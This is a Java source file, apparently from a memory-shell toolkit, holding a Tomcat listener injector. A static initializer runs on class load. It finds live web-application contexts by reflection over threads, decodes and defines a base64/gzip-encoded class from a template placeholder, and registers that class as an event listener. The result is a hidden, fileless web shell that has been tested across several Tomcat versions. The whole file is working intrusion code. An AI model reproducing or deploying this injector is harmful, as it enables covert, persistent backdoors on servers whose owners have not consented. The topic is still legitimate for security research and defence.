package com.reajason.javaweb.memshell.injector.tomcat;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * Tomcat Listener 注入器
 * 测试版本：
 * jdk    v1.8.0_275
 * tomcat v5.5.36, v6.0.9, v7.0.32, v8.5.83, v9.0.67
 *
 * @author pen4uin, ReaJason
 */
public class TomcatListenerInjector {

    static {
        new TomcatListenerInjector();
    }

    public TomcatListenerInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object listener = getShell(context);
                inject(context, listener);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public List<Object> getContext() throws Exception {
        List<Object> contexts = new ArrayList<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread.getName().contains("ContainerBackgroundProcessor")) {
                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                for (Object value : childrenMap.values()) {
                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                    contexts.addAll(children.values());
                }
            } else if (thread.getContextClassLoader() != null
                    && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader")
                    || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                contexts.add(getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context"));
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader webAppClassLoader = getWebAppClassLoader(context);
        try {
            return webAppClassLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(webAppClassLoader, clazzByte, 0, clazzByte.length);
            return clazz.newInstance();
        }
    }

    @SuppressWarnings("all")
    public void inject(Object context, Object listener) throws Exception {
        Object objects = invokeMethod(context, "getApplicationEventListeners", null, null);
        if (objects instanceof List) {
            List<Object> listeners = (List<Object>) objects;
            for (Object o : listeners) {
                if (o.getClass().getName().equals(getClassName())) {
                    System.out.println("listener already injected");
                    return;
                }
            }
            listeners.add(listener);
            System.out.println("listener inject successful");
        } else {
            ArrayList arrayList = new ArrayList(Arrays.asList(objects));
            for (Object o : arrayList) {
                if (o.getClass().getName().equals(getClassName())) {
                    System.out.println("listener already injected");
                    return;
                }
            }
            arrayList.add(listener);
            invokeMethod(context, "setApplicationEventListeners", new Class[]{Object[].class}, new Object[]{arrayList.toArray()});
            System.out.println("listener inject successful");
        }
    }


    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(name);
    }


    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        try {
            Field field = getField(obj, name);
            field.setAccessible(true);
            return field.get(obj);
        } catch (NoSuchFieldException ignored) {
        }
        return null;
    }


    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }

            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }
}
